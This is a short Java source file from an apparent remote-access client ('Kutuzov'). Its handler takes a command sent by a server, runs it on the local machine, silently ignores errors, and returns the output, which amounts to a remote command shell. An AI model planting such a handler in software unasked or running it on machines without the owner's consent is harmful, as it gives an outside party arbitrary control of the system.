package me.kutuzov.client;

import me.kutuzov.packet.*;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class KutuzovUnixPackets {
    public static void handlePacket(ObjectInputStream ois, ObjectOutputStream oos, Packet packet) {
        if(packet instanceof SCUnixCommandPacket) {
            new Thread(() -> {
                SCUnixCommandPacket p = (SCUnixCommandPacket)packet;
                String command = p.command;
                String result = "";

                try {
                    ProcessBuilder builder = new ProcessBuilder(command);
                    builder.redirectErrorStream(true);
                    Process process = builder.start();
                    BufferedReader r = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    String line;
                    while (true) {
                        line = r.readLine();
                        if (line == null)
                            break;

                        result+=line+"\n";
                    }
                } catch (Exception exception) {}

                try {
                    oos.writeObject(new CSUnixCommandResponsePacket(result));
                } catch (Exception e) { e.printStackTrace(); }
            }).start();
        }
    }
}